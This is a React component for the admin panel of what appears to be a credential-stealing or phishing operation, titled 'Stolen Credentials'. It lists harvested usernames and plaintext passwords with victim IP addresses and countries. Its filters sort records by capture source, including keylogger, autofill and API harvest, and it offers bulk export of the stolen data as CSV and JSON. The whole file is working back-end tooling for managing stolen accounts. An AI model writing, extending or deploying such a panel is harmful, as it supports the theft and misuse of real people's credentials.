import React, { useState, useEffect, useCallback } from 'react';
import { Box, Typography, TextField, Select, MenuItem, FormControl, InputLabel, Chip, IconButton, Button, Grid, Tooltip, Dialog, DialogTitle, DialogContent, DialogActions } from '@mui/material';
import { DataGrid } from '@mui/x-data-grid';
import RefreshIcon from '@mui/icons-material/Refresh';
import DeleteIcon from '@mui/icons-material/Delete';
import FileDownloadIcon from '@mui/icons-material/FileDownload';
import VisibilityIcon from '@mui/icons-material/Visibility';
import VisibilityOffIcon from '@mui/icons-material/VisibilityOff';
import ContentCopyIcon from '@mui/icons-material/ContentCopy';
import SearchIcon from '@mui/icons-material/Search';
import LockOpenIcon from '@mui/icons-material/LockOpen';
import axios from 'axios';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000';

const strengthColors = {
  weak: { bg: 'rgba(255,0,85,0.15)', text: '#ff0055', label: 'Weak' },
  medium: { bg: 'rgba(255,170,0,0.15)', text: '#ffaa00', label: 'Medium' },
  strong: { bg: 'rgba(0,240,255,0.12)', text: '#00f0ff', label: 'Strong' },
  'very-strong': { bg: 'rgba(0,255,136,0.12)', text: '#00ff88', label: 'Very Strong' },
  unknown: { bg: 'rgba(255,255,255,0.04)', text: '#888', label: 'Unknown' }
};

export default function CredentialsPage() {
  const [credentials, setCredentials] = useState([]);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(0);
  const [limit, setLimit] = useState(50);
  const [search, setSearch] = useState('');
  const [source, setSource] = useState('');
  const [strength, setStrength] = useState('');
  const [loading, setLoading] = useState(false);
  const [showPasswords, setShowPasswords] = useState({});
  const [deleteDialog, setDeleteDialog] = useState(null);
  const [showAllPasswords, setShowAllPasswords] = useState(false);

  const fetchCredentials = useCallback(async () => {
    setLoading(true);
    try {
      const params = { page: page + 1, limit, sortBy: '-capturedAt' };
      if (search) params.search = search;
      if (source) params.source = source;
      if (strength) params.strength = strength;
      const res = await axios.get(`${API_URL}/api/admin/credentials`, { params });
      setCredentials(res.data.credentials);
      setTotal(res.data.pagination.total);
    } catch(e) { console.error(e); }
    finally { setLoading(false); }
  }, [page, limit, search, source, strength]);

  useEffect(() => { fetchCredentials(); }, [fetchCredentials]);

  const handleDelete = async (id) => {
    try { 
      await axios.delete(`${API_URL}/api/admin/credentials/${id}`); 
      setDeleteDialog(null);
      fetchCredentials(); 
    } catch(e) { console.error(e); }
  };

  const togglePassword = (id) => {
    setShowPasswords(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const copyToClipboard = (text) => {
    if (text) navigator.clipboard.writeText(text);
  };

  const columns = [
    { field: '_id', headerName: 'ID', width: 70, renderCell: (params) => 
      <Typography sx={{ color: '#666', fontSize: '0.65rem', fontFamily: 'monospace' }}>...{params.value?.toString().slice(-6)}</Typography> },
    { field: 'username', headerName: 'Username', width: 140, renderCell: (params) => 
      <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5 }}>
        <Typography sx={{ color: '#fff', fontFamily: 'monospace', fontSize: '0.85rem', fontWeight: 500 }}>
          {params.value || params.row.email || 'N/A'}
        </Typography>
        {(params.value || params.row.email) && (
          <IconButton size="small" onClick={() => copyToClipboard(params.value || params.row.email)} sx={{ color: '#555', '&:hover': { color: '#00f0ff' } }}>
            <ContentCopyIcon sx={{ fontSize: 13 }} />
          </IconButton>
        )}
      </Box>
    },
    { field: 'password', headerName: 'Password', width: 200, renderCell: (params) => (
      <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.2 }}>
        <Typography sx={{ color: showPasswords[params.id] || showAllPasswords ? '#00ff88' : '#888', fontFamily: 'monospace', fontSize: '0.85rem' }}>
          {showPasswords[params.id] || showAllPasswords ? params.value || '(empty)' : '••••••••'}
        </Typography>
        <Tooltip title={showPasswords[params.id] ? 'Hide' : 'Show'}>
          <IconButton size="small" onClick={() => togglePassword(params.id)} sx={{ color: '#555', '&:hover': { color: '#00f0ff' } }}>
            {showPasswords[params.id] ? <VisibilityOffIcon sx={{ fontSize: 15 }} /> : <VisibilityIcon sx={{ fontSize: 15 }} />}
          </IconButton>
        </Tooltip>
        {params.value && (
          <Tooltip title="Copy">
            <IconButton size="small" onClick={() => copyToClipboard(params.value)} sx={{ color: '#555', '&:hover': { color: '#00ff88' } }}>
              <ContentCopyIcon sx={{ fontSize: 13 }} />
            </IconButton>
          </Tooltip>
        )}
      </Box>
    )},
    { field: 'email', headerName: 'Email', width: 170, renderCell: (params) => 
      <Typography sx={{ color: '#aaa', fontSize: '0.85rem' }}>{params.value || 'N/A'}</Typography>
    },
    { field: 'url', headerName: 'URL', width: 200, renderCell: (params) => 
      <Typography sx={{ color: '#888', fontSize: '0.78rem', overflow: 'hidden', textOverflow: 'ellipsis' }}>{params.value || 'N/A'}</Typography>
    },
    { field: 'source', headerName: 'Source', width: 110, renderCell: (params) => 
      <Chip label={params.value} size="small" sx={{ bgcolor: 'rgba(255,170,0,0.1)', color: '#ffaa00', fontWeight: 600, fontSize: '0.7rem' }} />
    },
    { field: 'strength', headerName: 'Strength', width: 110, renderCell: (params) => {
      const s = strengthColors[params.value] || strengthColors.unknown;
      return <Chip label={s.label} size="small" sx={{ bgcolor: s.bg, color: s.text, fontWeight: 600, fontSize: '0.7rem' }} />;
    }},
    { field: 'session', headerName: 'IP / Location', width: 160, renderCell: (params) => {
      const sid = params.row.sessionId;
      return <Box>
        <Typography sx={{ color: '#888', fontFamily: 'monospace', fontSize: '0.75rem' }}>{sid?.ipAddress || params.row.ipAddress || 'N/A'}</Typography>
        {sid?.geolocation?.country && <Typography sx={{ color: '#666', fontSize: '0.65rem' }}>{sid.geolocation.country}</Typography>}
      </Box>;
    }},
    { field: 'capturedAt', headerName: 'Captured', width: 150, renderCell: (params) => 
      <Typography sx={{ color: '#888', fontSize: '0.75rem' }}>{new Date(params.value).toLocaleString()}</Typography>
    },
    { field: 'actions', headerName: '', width: 60, renderCell: (params) => (
      <Tooltip title="Delete">
        <IconButton size="small" onClick={() => setDeleteDialog(params.id)} sx={{ color: '#555', '&:hover': { color: '#ff0055' } }}>
          <DeleteIcon sx={{ fontSize: 18 }} />
        </IconButton>
      </Tooltip>
    )}
  ];

  return (
    <Box>
      {/* Header */}
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 3, flexWrap: 'wrap', gap: 1 }}>
        <Box>
          <Typography variant="h4" sx={{ color: '#fff', fontWeight: 700, fontSize: '1.4rem' }}>
            🔑 Stolen Credentials
          </Typography>
          <Typography sx={{ color: '#888', fontSize: '0.85rem', mt: 0.2 }}>
            {total} total credentials · Page {page + 1} of {Math.ceil(total / limit) || 1}
          </Typography>
        </Box>
        <Box sx={{ display: 'flex', gap: 1 }}>
          <Button
            variant="outlined"
            size="small"
            startIcon={showAllPasswords ? <VisibilityOffIcon /> : <LockOpenIcon />}
            onClick={() => setShowAllPasswords(!showAllPasswords)}
            sx={{ borderColor: showAllPasswords ? '#00ff88' : '#555', color: showAllPasswords ? '#00ff88' : '#aaa' }}
          >
            {showAllPasswords ? 'Hide All' : 'Show All'}
          </Button>
          <Button variant="outlined" size="small" startIcon={<FileDownloadIcon />} href="/api/admin/credentials/export/csv"
            sx={{ borderColor: '#00ff88', color: '#00ff88' }}>CSV</Button>
          <Button variant="outlined" size="small" startIcon={<FileDownloadIcon />} href="/api/admin/credentials/export/json"
            sx={{ borderColor: '#00f0ff', color: '#00f0ff' }}>JSON</Button>
          <Button variant="outlined" size="small" startIcon={<RefreshIcon />} onClick={fetchCredentials} sx={{ borderColor: '#555', color: '#aaa' }}>Refresh</Button>
        </Box>
      </Box>

      {/* Stats bar */}
      <Box sx={{ display: 'flex', gap: 1, mb: 2.5, flexWrap: 'wrap' }}>
        <Chip label={`🔑 ${total} Total`} sx={{ bgcolor: 'rgba(0,240,255,0.08)', color: '#00f0ff' }} />
        <Chip label={`📋 ${credentials.length} Loaded`} sx={{ bgcolor: 'rgba(255,255,255,0.04)', color: '#888' }} />
        {showAllPasswords && <Chip label="🔓 Passwords Visible" sx={{ bgcolor: 'rgba(255,0,85,0.12)', color: '#ff0055' }} />}
      </Box>

      {/* Filters */}
      <Grid container spacing={2} sx={{ mb: 2.5 }}>
        <Grid item xs={12} sm={4}>
          <TextField fullWidth size="small" placeholder="🔍 Search username, email, URL, password..." value={search} onChange={(e) => { setSearch(e.target.value); setPage(0); }}
            sx={{ input: { color: '#fff' }, '& .MuiOutlinedInput-root fieldset': { borderColor: 'rgba(255,255,255,0.15)' } }} />
        </Grid>
        <Grid item xs={6} sm={2}>
          <FormControl fullWidth size="small">
            <InputLabel sx={{ color: '#888' }}>Source</InputLabel>
            <Select value={source} label="Source" onChange={(e) => { setSource(e.target.value); setPage(0); }} sx={{ color: '#fff' }}>
              <MenuItem value="">All Sources</MenuItem>
              <MenuItem value="form-submit">Form Submit</MenuItem>
              <MenuItem value="autofill">Autofill</MenuItem>
              <MenuItem value="keylogger">Keylogger</MenuItem>
              <MenuItem value="manual-input">Manual</MenuItem>
              <MenuItem value="api-harvest">API Harvest</MenuItem>
            </Select>
          </FormControl>
        </Grid>
        <Grid item xs={6} sm={2}>
          <FormControl fullWidth size="small">
            <InputLabel sx={{ color: '#888' }}>Strength</InputLabel>
            <Select value={strength} label="Strength" onChange={(e) => { setStrength(e.target.value); setPage(0); }} sx={{ color: '#fff' }}>
              <MenuItem value="">All Strengths</MenuItem>
              <MenuItem value="weak">Weak</MenuItem>
              <MenuItem value="medium">Medium</MenuItem>
              <MenuItem value="strong">Strong</MenuItem>
              <MenuItem value="very-strong">Very Strong</MenuItem>
            </Select>
          </FormControl>
        </Grid>
        <Grid item xs={12} sm={2}>
          <Chip label={`${total} results`} sx={{ bgcolor: 'rgba(0,240,255,0.08)', color: '#00f0ff', width: '100%', height: 40, borderRadius: 1, fontSize: '0.85rem' }} />
        </Grid>
      </Grid>

      {/* Data Table */}
      <Box sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.06)', height: 600, borderRadius: 2, overflow: 'hidden' }}>
        <DataGrid
          rows={credentials}
          columns={columns}
          getRowId={(row) => row._id}
          rowCount={total}
          loading={loading}
          pageSizeOptions={[25, 50, 100]}
          paginationModel={{ page, pageSize: limit }}
          onPaginationModelChange={(m) => { setPage(m.page); setLimit(m.pageSize); }}
          paginationMode="server"
          sx={{ 
            color: '#ccc', border: 'none',
            '& .MuiDataGrid-cell': { borderColor: 'rgba(255,255,255,0.04)' },
            '& .MuiDataGrid-columnHeaders': { bgcolor: 'rgba(255,255,255,0.02)', color: '#888', fontWeight: 600 },
            '& .MuiDataGrid-footerContainer': { borderTop: '1px solid rgba(255,255,255,0.06)' },
            '& .MuiDataGrid-row': { '&:hover': { bgcolor: 'rgba(0,240,255,0.03)' } }
          }}
        />
      </Box>

      {/* Delete Confirmation */}
      <Dialog open={!!deleteDialog} onClose={() => setDeleteDialog(null)}>
        <DialogTitle sx={{ bgcolor: '#0d1117', color: '#fff', borderBottom: '1px solid rgba(255,255,255,0.06)' }}>
          Delete Credential
        </DialogTitle>
        <DialogContent sx={{ bgcolor: '#0d1117', color: '#aaa', py: 3 }}>
          Are you sure you want to delete this credential? This action cannot be undone.
        </DialogContent>
        <DialogActions sx={{ bgcolor: '#0d1117', p: 2, borderTop: '1px solid rgba(255,255,255,0.06)' }}>
          <Button onClick={() => setDeleteDialog(null)} sx={{ color: '#888' }}>Cancel</Button>
          <Button onClick={() => handleDelete(deleteDialog)} variant="contained" sx={{ bgcolor: '#ff0055', '&:hover': { bgcolor: '#cc0044' } }}>Delete</Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
}